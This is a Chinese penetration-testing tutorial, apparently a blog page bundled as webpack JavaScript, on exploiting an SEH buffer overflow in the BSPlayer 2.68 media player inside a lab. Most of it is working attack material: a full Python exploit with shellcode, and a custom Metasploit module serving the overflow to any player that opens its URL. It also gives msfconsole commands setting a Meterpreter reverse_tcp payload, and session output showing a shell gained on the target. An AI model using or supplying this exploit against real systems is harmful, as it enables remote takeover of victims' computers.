(window.webpackJsonp=window.webpackJsonp||[]).push([[366],{662:function(s,n,a){"use strict";a.r(n);var e=a(7),t=Object(e.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"metasploit渗透bsplayer-v2-68"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#metasploit渗透bsplayer-v2-68"}},[s._v("#")]),s._v(" Metasploit渗透BSPlayer V2.68")]),s._v(" "),n("p",[s._v("攻击机 Kali 192.168.109.137")]),s._v(" "),n("p",[s._v("靶机 WinXP 192.168.109.141")]),s._v(" "),n("p",[s._v("应用程序 BSPlayer V2.68 (可以到链接https://download.csdn.net/download/l1028386804/10923699下载BSPlayer V2.68 + 渗透脚本 )")]),s._v(" "),n("h2",{attrs:{id:"运行渗透脚本36477-py"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#运行渗透脚本36477-py"}},[s._v("#")]),s._v(" 运行渗透脚本36477.py")]),s._v(" "),n("p",[s._v("在靶机的命令行下切换到脚本36477.py所在的目录并输入如下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("python 36477.py 127.0.0.1 81\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117180920798.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"安装并打开bsplayer"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#安装并打开bsplayer"}},[s._v("#")]),s._v(" 安装并打开Bsplayer")]),s._v(" "),n("p",[s._v("安装略。")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117180940577.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("此时，在Bsplayer中依次单击menu->打开 URL(U)... 载入要加载的链接，这里载入的链接为脚本36477.py监听的地址和端口,即：http://127.0.0.1:81，如下图：")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117181000232.png",loading:"lazy"}})]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117181008451.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("点击确定后，发现弹出了计算器窗口。")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117181025522.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("说明BSPlayer V2.68 存在溢出漏洞。")]),s._v(" "),n("h2",{attrs:{id:"分析36477-py脚本"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#分析36477-py脚本"}},[s._v("#")]),s._v(" 分析36477.py脚本")]),s._v(" "),n("p",[s._v("脚本具体内容如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('#!/usr/bin/python\n\n\'\'\' Bsplayer suffers from a buffer overflow vulnerability when processing the HTTP response when opening a URL.\nIn order to exploit this bug I partially overwrited the seh record to land at pop pop ret instead of the full\naddress and then used backward jumping to jump to a long jump that eventually land in my shellcode.\n\nTested on : windows xp sp1 - windows 7 sp1 - Windows 8 Enterprise it might work in other versions as well just give it a try :)\n\nMy twitter: @fady_osman\nMy youtube: https://www.youtube.com/user/cutehack3r\n\'\'\'\n\nimport socket\nimport sys\ns = socket.socket()         # Create a socket object\nif(len(sys.argv) < 3):\n  print "[x] Please enter an IP and port to listen to."\n  print "[x] " + sys.argv[0] + " ip port"\n  exit()\nhost = sys.argv[1]      # Ip to listen to.\nport = int(sys.argv[2])     # Reserve a port for your service.\ns.bind((host, port))        # Bind to the port\nprint "[*] Listening on port " + str(port)\ns.listen(5)                 # Now wait for client connection.\nc, addr = s.accept()        # Establish connection with client.\n# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.\nprint((\'[*] Sending the payload first time\', addr))\nc.recv(1024)\n#seh and nseh.\nbuf =  ""\nbuf += "\\xbb\\xe4\\xf3\\xb8\\x70\\xda\\xc0\\xd9\\x74\\x24\\xf4\\x58\\x31"\nbuf += "\\xc9\\xb1\\x33\\x31\\x58\\x12\\x83\\xc0\\x04\\x03\\xbc\\xfd\\x5a"\nbuf += "\\x85\\xc0\\xea\\x12\\x66\\x38\\xeb\\x44\\xee\\xdd\\xda\\x56\\x94"\nbuf += "\\x96\\x4f\\x67\\xde\\xfa\\x63\\x0c\\xb2\\xee\\xf0\\x60\\x1b\\x01"\nbuf += "\\xb0\\xcf\\x7d\\x2c\\x41\\xfe\\x41\\xe2\\x81\\x60\\x3e\\xf8\\xd5"\nbuf += "\\x42\\x7f\\x33\\x28\\x82\\xb8\\x29\\xc3\\xd6\\x11\\x26\\x76\\xc7"\nbuf += "\\x16\\x7a\\x4b\\xe6\\xf8\\xf1\\xf3\\x90\\x7d\\xc5\\x80\\x2a\\x7f"\nbuf += "\\x15\\x38\\x20\\x37\\x8d\\x32\\x6e\\xe8\\xac\\x97\\x6c\\xd4\\xe7"\nbuf += "\\x9c\\x47\\xae\\xf6\\x74\\x96\\x4f\\xc9\\xb8\\x75\\x6e\\xe6\\x34"\nbuf += "\\x87\\xb6\\xc0\\xa6\\xf2\\xcc\\x33\\x5a\\x05\\x17\\x4e\\x80\\x80"\nbuf += "\\x8a\\xe8\\x43\\x32\\x6f\\x09\\x87\\xa5\\xe4\\x05\\x6c\\xa1\\xa3"\nbuf += "\\x09\\x73\\x66\\xd8\\x35\\xf8\\x89\\x0f\\xbc\\xba\\xad\\x8b\\xe5"\nbuf += "\\x19\\xcf\\x8a\\x43\\xcf\\xf0\\xcd\\x2b\\xb0\\x54\\x85\\xd9\\xa5"\nbuf += "\\xef\\xc4\\xb7\\x38\\x7d\\x73\\xfe\\x3b\\x7d\\x7c\\x50\\x54\\x4c"\nbuf += "\\xf7\\x3f\\x23\\x51\\xd2\\x04\\xdb\\x1b\\x7f\\x2c\\x74\\xc2\\x15"\nbuf += "\\x6d\\x19\\xf5\\xc3\\xb1\\x24\\x76\\xe6\\x49\\xd3\\x66\\x83\\x4c"\nbuf += "\\x9f\\x20\\x7f\\x3c\\xb0\\xc4\\x7f\\x93\\xb1\\xcc\\xe3\\x72\\x22"\nbuf += "\\x8c\\xcd\\x11\\xc2\\x37\\x12"\n\njmplong = "\\xe9\\x85\\xe9\\xff\\xff"\nnseh = "\\xeb\\xf9\\x90\\x90"\n# Partially overwriting the seh record (nulls are ignored).\nseh = "\\x3b\\x58\\x00\\x00"\nbuflen = len(buf)\nresponse = "\\x90" *2048 + buf + "\\xcc" * (6787 - 2048 - buflen) + jmplong + nseh + seh #+ "\\xcc" * 7000\nc.send(response)\nc.close()\nc, addr = s.accept()        # Establish connection with client.\n# Sending the m3u file so we can reconnect to our server to send both the flv file and later the payload.\nprint((\'[*] Sending the payload second time\', addr))\nc.recv(1024)\nc.send(response)\nc.close()\ns.close()\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br")])]),n("p",[s._v("由此脚本我们可以得出几个重要的信息：")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117181117230.png",loading:"lazy"}})]),s._v(" "),n("p",[s._v("由此，我们就可以编写渗透模块了。")]),s._v(" "),n("p",[n("strong",[s._v("注意：在当前场景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标请求之后，要向其发送恶意的内容。")])]),s._v(" "),n("h2",{attrs:{id:"创建metasploit渗透脚本bsplayer-attack-by-binghe-rb"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#创建metasploit渗透脚本bsplayer-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 创建Metasploit渗透脚本bsplayer_attack_by_binghe.rb")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("##\n# Author 冰河\n# Date 2019-01-17\n# Description Metasploit渗透 Bsplayer V2.68\n#\n# 在当前场景中，需要目标计算机主动来连接我们的渗透服务器，而不是我们去连接目标服务器。\n# 因此我们的渗透服务器必须时刻对即将到来的连接处于监听状态。当收到目标请求之后，要向\n# 其发送恶意的内容。\n##\n\nrequire 'msf/core'\n\nclass Metasploit3 < Msf::Exploit::Remote\n  Rank = NormalRanking\n  \n  include Msf::Exploit::Remote::TcpServer\n  \n  def initialize(info = {})\n    super(update_info(info,\n      'Name'              => \"BsPlayer 2.68 SEH Overflow Exploit\",\n      'Description'       => %q{\n          Here's an example of server Based Exploit\n      },\n      'Author'            => ['binghe'],\n      'Platform'          => 'Windows',\n      'Targets'           => \n        [\n          ['Generic', {'Ret'  => 0x0000583b, 'Offset' => 2048}],\n        ],\n      'Payload'           =>\n        {\n          'BadChars'      => \"\\x00\\x0a\\x20\\x0d\"\n        },\n      'DisclosureDate'    => \"2017-01-17\",\n      'DefaultTarget'     => 0))\n   end\n   \n  def on_client_connect(client)\n    return if((p = regenerate_payload(client)) == nil)\n    print_status(\"Client Connected\")\n    sploit = make_nops(target['Offset'])\n    sploit << payload.encoded\n    sploit << \"\\xcc\" * (6787 - 2048 - payload.encoded.length)\n    sploit << \"\\xe9\\x85\\xe9\\xff\\xff\"\n    sploit << \"\\xeb\\xf9\\x90\\x90\"\n    sploit << [target.ret].pack('V')\n    client.put(sploit)\n    client.get_once\n    client.put(sploit)\n    handler(client)\n    service.close_client(client)\n  end\nend\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br")])]),n("h2",{attrs:{id:"上传渗透脚本bsplayer-attack-by-binghe-rb"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#上传渗透脚本bsplayer-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 上传渗透脚本bsplayer_attack_by_binghe.rb")]),s._v(" "),n("p",[s._v("将渗透脚本bsplayer_attack_by_binghe.rb上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit目录下")]),s._v(" "),n("h2",{attrs:{id:"运行渗透脚本bsplayer-attack-by-binghe-rb"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#运行渗透脚本bsplayer-attack-by-binghe-rb"}},[s._v("#")]),s._v(" 运行渗透脚本bsplayer_attack_by_binghe.rb")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msfconsole\nuse exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe \nset SRVHOST 192.168.109.137\nset SRVPORT 8080\nset payload windows/meterpreter/reverse_tcp\nset LHOST 192.168.109.137\nset LPORT 8888\nshow options\nexploit\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br")])]),n("p",[s._v("具体操作效果如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msf > use exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe \nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set SRVHOST 192.168.109.137\nSRVHOST => 192.168.109.137\nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set SRVPORT 8080\nSRVPORT => 8080\nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set LHOST 192.168.109.137\nLHOST => 192.168.109.137\nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > set LPORT 8888\nLPORT => 8888\nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > show options\n\nModule options (exploit/windows/masteringmetasploit/bsplayer_attack_by_binghe):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SRVHOST  192.168.109.137  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT  8080             yes       The local port to listen on.\n   SSL      false            no        Negotiate SSL for incoming connections\n   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.109.137  yes       The listen address (an interface may be specified)\n   LPORT     8888             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Generic\n\n\nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > exploit\n[*] Exploit running as background job 0.\n\n[*] Started reverse TCP handler on 192.168.109.137:8888 \nmsf exploit(windows/masteringmetasploit/bsplayer_attack_by_binghe) > [*] Started service listener on 192.168.109.137:8080 \n[*] Server started.\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br")])]),n("h2",{attrs:{id:"打开bsplay并设置打开的url"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#打开bsplay并设置打开的url"}},[s._v("#")]),s._v(" 打开Bsplay并设置打开的URL")]),s._v(" "),n("p",[s._v("打开Bsplay并将URL设置为http://192.168.109.137:8080,点击确定按钮")]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117181414585.png",loading:"lazy"}})]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190117181421865.png",loading:"lazy"}})]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019011718143024.png",loading:"lazy"}})]),s._v(" "),n("h2",{attrs:{id:"查看kali终端结果"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#查看kali终端结果"}},[s._v("#")]),s._v(" 查看Kali终端结果")]),s._v(" "),n("p",[s._v("此时，我们切换到Kali下查看结果，输出如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("[*] Client Connected\n[*] Client Connected\n[*] Sending stage (179779 bytes) to 192.168.109.141\nmeterpreter > ifconfig\n\nInterface  1\n============\nName         : MS TCP Loopback interface\nHardware MAC : 00:00:00:00:00:00\nMTU          : 1520\nIPv4 Address : 127.0.0.1\n\n\nInterface 65539\n============\nName         : VMware Accelerated AMD PCNet Adapter\nHardware MAC : 00:0c:29:5d:8e:d4\nMTU          : 1500\nIPv4 Address : 192.168.109.141\nIPv4 Netmask : 255.255.255.0\n\n\nInterface 65540\n============\nName         : Bluetooth �s\nHardware MAC : 3c:a0:67:1a:fe:b4\nMTU          : 1500\n\nmeterpreter > \n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br")])]),n("p",[s._v("此时，我们通过BSPlayer的漏洞拿下了目标主机的Materpreter Shell。")]),s._v(" "),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=t.exports}}]);